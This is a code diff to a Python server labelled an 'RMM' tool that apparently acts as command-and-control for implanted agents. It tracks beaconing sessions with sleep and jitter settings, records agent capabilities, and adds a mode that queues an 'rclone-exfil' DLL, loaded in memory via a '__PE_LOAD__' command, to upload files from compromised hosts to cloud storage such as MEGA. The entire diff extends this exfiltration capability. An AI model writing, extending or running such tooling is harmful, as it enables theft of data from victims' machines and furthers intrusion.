@@ -36,6 +36,7 @@ import shutil
 import subprocess
 import shlex
 import zipfile
+import json
 
 try:
     from prompt_toolkit.completion import Completer as _PTCompleterBase
@@ -50,6 +51,10 @@ from rmm_rclone import (
     RCLONE_BIN_PATH,
     DEFAULT_PROFILE,
     build_exfil_command,
+    get_profile,
+    resolve_dest_path,
+    RCLONE_REMOTE_NAME,
+    list_plugin_files,
     rclone_binary_available,
     rclone_public_config,
 )
@@ -546,6 +551,8 @@ class Session:
         self.cmd_timeout = 30
         self.work_dir = None
         self.os_type = "windows"
+        self.agent_type = "powershell"
+        self.capabilities = []
         # Configuration parameters
         self.sleep_seconds = 60  # Default 1 minute
         self.jitter_percent = 30  # Default 30% jitter
@@ -584,6 +591,8 @@ class Session:
             "beacon_status": self.beacon_status(),
             "work_dir": self.work_dir,
             "os_type": self.os_type,
+            "agent_type": self.agent_type,
+            "capabilities": list(self.capabilities),
             "sleep_seconds": self.sleep_seconds,
             "jitter_percent": self.jitter_percent
         }
@@ -1206,7 +1215,40 @@ class RMMServer:
         remote_path: str,
         profile_name: str,
         dest: str | None = None,
+        mode: str = "auto",
     ) -> str:
+        """Queue exfil using the selected plugin or binary execution mode."""
+        mode = (mode or "auto").strip().lower()
+        if mode not in {"auto", "plugin", "binary"}:
+            raise ValueError("exfil mode must be auto, plugin, or binary")
+        plugin_name = next(
+            (item["name"] for item in list_plugin_files()
+             if item.get("name", "").lower().startswith("rclone-exfil")
+             and item.get("name", "").lower().endswith(".dll")),
+            None,
+        )
+        plugin_ready = bool(plugin_name and session.agent_type == "go" and "pe" in session.capabilities)
+        if mode in {"auto", "plugin"} and plugin_ready:
+            profile = get_profile(profile_name)
+            settings = {
+                str(key): str(value) for key, value in profile.items()
+                if key not in {"type", "folder", "name", "description", "pass_obscured"}
+                and value is not None
+            }
+            plugin_job = {
+                "source": remote_path,
+                "account": RCLONE_REMOTE_NAME,
+                "backend": profile.get("type"),
+                "target": resolve_dest_path(profile, remote_path, dest),
+                "settings": settings,
+                "make_link": bool(profile.get("type") == "mega"),
+                "max_minutes": 30,
+            }
+            cmd = f"__PE_LOAD__ {plugin_name} Run {json.dumps(plugin_job, separators=(',', ':'))}"
+            self.set_command(session.id, cmd, "oneshot")
+            return cmd
+        if mode == "plugin":
+            raise ValueError("rclone plugin unavailable for this agent or server")
         """Queue __EXFIL__ on the agent (rclone upload from agent host)."""
         if not rclone_binary_available():
             raise ValueError(
@@ -1733,6 +1775,8 @@ class RMMServer:
         sleep_seconds=None,
         jitter_percent=None,
         sync_client_config=False,
+        agent_type="powershell",
+        capabilities=None,
     ):
         to_save = None
         is_new = False
@@ -1744,6 +1788,8 @@ class RMMServer:
                 persisted = self._persisted_config_from_history_meta(session_id)
             if session_id not in self.sessions:
                 session = Session(session_id, hostname, username, ip)
+                session.agent_type = (agent_type or "powershell").strip().lower()
+                session.capabilities = sorted(set(capabilities or []))
                 if persisted:
                     session.sleep_seconds = persisted["sleep_seconds"]
                     session.jitter_percent = persisted["jitter_percent"]
@@ -1764,6 +1810,8 @@ class RMMServer:
                 s.username = username
                 if ip is not None:
                     s.ip = ip
+                s.agent_type = (agent_type or s.agent_type or "powershell").strip().lower()
+                s.capabilities = sorted(set(capabilities or s.capabilities or []))
                 if sync_client_config and not persisted and not s.config_synced:
                     if sleep_seconds is not None:
                         s.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
@@ -2386,7 +2434,14 @@ class RMMHandler(BaseHTTPRequestHandler):
         srv = self.server_instance
 
         if parts == ["rclone", "config"]:
-            self._json(200, rclone_public_config())
+            config = rclone_public_config()
+            config["rclone_plugin"] = next(
+                (item for item in list_plugin_files()
+                 if item.get("name", "").lower().startswith("rclone-exfil")
+                 and item.get("name", "").lower().endswith(".dll")),
+                None,
+            )
+            self._json(200, config)
             return True
 
         if parts == ["health"]:
@@ -2635,8 +2690,9 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return True
             profile = (body.get("profile") or DEFAULT_PROFILE).strip()
             dest = (body.get("dest") or "").strip() or None
+            mode = (body.get("mode") or "auto").strip().lower()
             try:
-                cmd = srv.queue_agent_exfil(session, remote_path, profile, dest=dest)
+                cmd = srv.queue_agent_exfil(session, remote_path, profile, dest=dest, mode=mode)
             except (ValueError, RcloneConfigError) as e:
                 self._json(503, {"error": str(e), "rclone": rclone_public_config()})
                 return True
@@ -2648,6 +2704,7 @@ class RMMHandler(BaseHTTPRequestHandler):
                     "session_id": session.id,
                     "queued": cmd.split("\n", 1)[0],
                     "profile": profile,
+                    "mode": mode,
                     "max_bytes": get_rclone_max_bytes(),
                     "rclone": rclone_public_config(),
                 },
@@ -2981,6 +3038,8 @@ class RMMHandler(BaseHTTPRequestHandler):
             sleep_seconds = None
             jitter_percent = None
             sync_client = str(qs.get("sync", ["0"])[0]).lower() in ("1", "true", "yes")
+            agent_type = qs.get("agent", ["powershell"])[0]
+            capabilities = [item.strip().lower() for item in qs.get("caps", [""])[0].split(",") if item.strip()]
             try:
                 if qs.get("s", [None])[0] is not None:
                     sleep_seconds = int(qs["s"][0])
@@ -2999,6 +3058,8 @@ class RMMHandler(BaseHTTPRequestHandler):
                 sleep_seconds=sleep_seconds,
                 jitter_percent=jitter_percent,
                 sync_client_config=sync_client,
+                agent_type=agent_type,
+                capabilities=capabilities,
             )
             if reg is None:
                 self._respond(403, "TERMINATED")
